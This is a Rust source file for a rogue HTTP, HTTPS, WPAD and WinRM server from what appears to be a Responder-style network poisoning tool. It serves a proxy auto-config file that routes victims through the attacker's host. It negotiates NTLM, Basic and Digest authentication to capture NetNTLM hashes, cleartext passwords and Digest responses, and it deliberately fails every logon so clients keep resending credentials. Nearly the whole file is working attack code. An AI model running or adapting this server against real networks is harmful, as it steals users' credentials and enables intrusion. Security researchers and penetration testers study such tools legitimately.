//! Rogue HTTP/HTTPS/WPAD server. Negotiates NTLM/Basic/Digest, captures the credentials and
//! always fails the logon (so the client keeps retrying against us), mirroring the reference
//! tool.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as B64;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio_rustls::TlsAcceptor;

use crate::capture::model::{ArtifactType, CaptureArtifact, Protocol};
use crate::constants::Service;
use crate::crypto::challenge;
use crate::net::tls;
use crate::protocols::ntlm;

use super::ServerContext;

pub async fn serve_plain(listener: TcpListener, ctx: Arc<ServerContext>) -> Result<()> {
    loop {
        let (stream, peer) = listener.accept().await?;
        let ctx = ctx.clone();
        tokio::spawn(async move {
            let _ = serve_conn(stream, peer, ctx, Protocol::Http).await;
        });
    }
}

pub async fn serve_tls(listener: TcpListener, ctx: Arc<ServerContext>) -> Result<()> {
    let config = tls::server_config(&ctx.cfg.ssl_cert, &ctx.cfg.ssl_key)?;
    let acceptor = TlsAcceptor::from(config);
    loop {
        let (stream, peer) = listener.accept().await?;
        let acceptor = acceptor.clone();
        let ctx = ctx.clone();
        tokio::spawn(async move {
            match acceptor.accept(stream).await {
                Ok(tls_stream) => {
                    let _ = serve_conn(tls_stream, peer, ctx, Protocol::Https).await;
                }
                Err(e) => tracing::debug!("tls handshake from {peer} failed: {e}"),
            }
        });
    }
}

/// Serve WinRM (reuses the HTTP logic on 5985/5986).
pub async fn serve_winrm(
    listener: TcpListener,
    ctx: Arc<ServerContext>,
    tls_mode: bool,
) -> Result<()> {
    if tls_mode {
        serve_tls(listener, ctx).await
    } else {
        loop {
            let (stream, peer) = listener.accept().await?;
            let ctx = ctx.clone();
            tokio::spawn(async move {
                let _ = serve_conn(stream, peer, ctx, Protocol::Winrm).await;
            });
        }
    }
}

async fn read_request<S: AsyncRead + Unpin>(stream: &mut S) -> Option<String> {
    let mut buf = Vec::new();
    let mut byte = [0u8; 1];
    loop {
        let n = stream.read(&mut byte).await.ok()?;
        if n == 0 {
            return None;
        }
        buf.push(byte[0]);
        if buf.len() >= 4 && &buf[buf.len() - 4..] == b"\r\n\r\n" {
            break;
        }
        if buf.len() > 1 << 20 {
            return None;
        }
    }
    Some(String::from_utf8_lossy(&buf).to_string())
}

fn header(raw: &str, name: &str) -> Option<String> {
    for line in raw.lines().skip(1) {
        if let Some((k, v)) = line.split_once(':')
            && k.trim().eq_ignore_ascii_case(name)
        {
            return Some(v.trim().to_string());
        }
    }
    None
}

async fn write_response<S: AsyncWrite + Unpin>(
    stream: &mut S,
    status: &str,
    extra_headers: &[(&str, &str)],
    body: &[u8],
    content_type: &str,
) -> std::io::Result<()> {
    let mut resp = format!("HTTP/1.1 {status}\r\n");
    resp.push_str(&format!("Content-Length: {}\r\n", body.len()));
    resp.push_str(&format!("Content-Type: {content_type}\r\n"));
    resp.push_str("Connection: close\r\n");
    for (k, v) in extra_headers {
        resp.push_str(&format!("{k}: {v}\r\n"));
    }
    resp.push_str("\r\n");
    stream.write_all(resp.as_bytes()).await?;
    stream.write_all(body).await?;
    stream.flush().await
}

pub async fn serve_conn<S: AsyncRead + AsyncWrite + Unpin>(
    mut stream: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
    protocol: Protocol,
) -> Result<()> {
    let Some(raw) = read_request(&mut stream).await else {
        return Ok(());
    };
    let request_line = raw.lines().next().unwrap_or_default().to_string();
    let path = request_line.split_whitespace().nth(1).unwrap_or("/");
    let is_proxy = path.starts_with("http://") || path.starts_with("https://");

    // WPAD / proxy auto-config.
    let wpad_path = path.contains("wpad.dat") || path.contains("proxy.pac");
    if wpad_path {
        let pac = format!(
            "function FindProxyForURL(url, host) {{ return \"PROXY {}:80; DIRECT\"; }}\r\n",
            ctx.local_ip
        );
        let auth_header = header(&raw, "authorization");
        if ctx.cfg.force_wpad_auth && auth_header.is_none() {
            return challenge_response(
                &mut stream,
                ctx.as_ref(),
                peer,
                protocol,
                false,
                "407 Proxy Authentication Required",
                "Proxy-Authenticate",
            )
            .await;
        }
        write_response(
            &mut stream,
            "200 OK",
            &[],
            pac.as_bytes(),
            "application/x-ns-proxy-autoconfig",
        )
        .await?;
        return Ok(());
    }

    let auth = header(&raw, "authorization").or_else(|| header(&raw, "proxy-authorization"));
    let Some(auth) = auth else {
        let (status, hdr) = if is_proxy {
            ("407 Proxy Authentication Required", "Proxy-Authenticate")
        } else {
            ("401 Unauthorized", "WWW-Authenticate")
        };
        return challenge_response(
            &mut stream,
            ctx.as_ref(),
            peer,
            protocol,
            is_proxy,
            status,
            hdr,
        )
        .await;
    };

    let (scheme, param) = match auth.split_once(' ') {
        Some((s, p)) => (s.to_ascii_lowercase(), p.trim().to_string()),
        None => (auth.to_ascii_lowercase(), String::new()),
    };

    match scheme.as_str() {
        "ntlm" | "negotiate" => {
            let decoded = B64.decode(&param).unwrap_or_default();
            match ntlm::message_type(&decoded) {
                Some(1) => {
                    let challenge = ctx.build_challenge(service_for(protocol));
                    let token = B64.encode(&challenge);
                    let (status, hdr) = if is_proxy {
                        ("407 Proxy Authentication Required", "Proxy-Authenticate")
                    } else {
                        ("401 Unauthorized", "WWW-Authenticate")
                    };
                    let value = format!("NTLM {token}");
                    let body = ctx.read_html();
                    write_response(&mut stream, status, &[(hdr, &value)], &body, "text/html")
                        .await?;
                }
                Some(3) => {
                    let ch = ctx.challenge_for(service_for(protocol));
                    if let Some(net) = ntlm::parse_type3(&decoded, &ch) {
                        ctx.sink
                            .artifact(CaptureArtifact::netntlm(protocol, peer.ip(), &net));
                    }
                    let (status, hdr) = if is_proxy {
                        ("407 Proxy Authentication Required", "Proxy-Authenticate")
                    } else {
                        ("401 Unauthorized", "WWW-Authenticate")
                    };
                    let body = ctx.read_html();
                    write_response(&mut stream, status, &[(hdr, "NTLM")], &body, "text/html")
                        .await?;
                }
                _ => {
                    let body = ctx.read_html();
                    write_response(&mut stream, "401 Unauthorized", &[], &body, "text/html")
                        .await?;
                }
            }
        }
        "basic" => {
            let decoded = B64.decode(&param).unwrap_or_default();
            let text = String::from_utf8_lossy(&decoded).to_string();
            let (user, pass) = text.split_once(':').unwrap_or((text.as_str(), ""));
            if let Some(art) = CaptureArtifact::cleartext(protocol, peer.ip(), user, pass) {
                ctx.sink.artifact(art);
            }
            let body = ctx.read_html();
            write_response(&mut stream, "401 Unauthorized", &[], &body, "text/html").await?;
        }
        "digest" => {
            let digest = challenge::parse_digest_md5(&param);
            if let Some(line) = digest.capture_line() {
                let user = digest.username.clone().unwrap_or_default();
                let art = CaptureArtifact::challenge_response(
                    protocol,
                    ArtifactType::DigestMd5,
                    peer.ip(),
                    &user,
                    &line,
                );
                ctx.sink.artifact(art);
            }
            let body = ctx.read_html();
            write_response(&mut stream, "401 Unauthorized", &[], &body, "text/html").await?;
        }
        _ => {
            let body = ctx.read_html();
            write_response(&mut stream, "401 Unauthorized", &[], &body, "text/html").await?;
        }
    }
    Ok(())
}

fn service_for(protocol: Protocol) -> Service {
    match protocol {
        Protocol::Https => Service::Https,
        Protocol::Winrm => Service::Winrm,
        Protocol::Winrms => Service::Winrms,
        Protocol::Wpad => Service::Wpad,
        _ => Service::Http,
    }
}

async fn challenge_response<S: AsyncWrite + Unpin>(
    stream: &mut S,
    ctx: &ServerContext,
    _peer: SocketAddr,
    _protocol: Protocol,
    _is_proxy: bool,
    status: &str,
    auth_header: &str,
) -> Result<()> {
    let mut offered = Vec::new();
    offered.push("NTLM".to_string());
    if !ctx.cfg.force_basic_only {
        offered.push("Negotiate".to_string());
    }
    offered.push(format!("Basic realm=\"{}\"", ctx.netbios()));
    let value = offered.join(", ");
    let body = ctx.read_html();
    write_response(stream, status, &[(auth_header, &value)], &body, "text/html").await?;
    Ok(())
}

impl ServerContext {
    /// The default HTML body served on the auth endpoint.
    pub fn read_html(&self) -> Vec<u8> {
        std::fs::read(&self.cfg.html_filename)
            .unwrap_or_else(|_| b"<html><body><h1>401 Unauthorized</h1></body></html>".to_vec())
    }
}
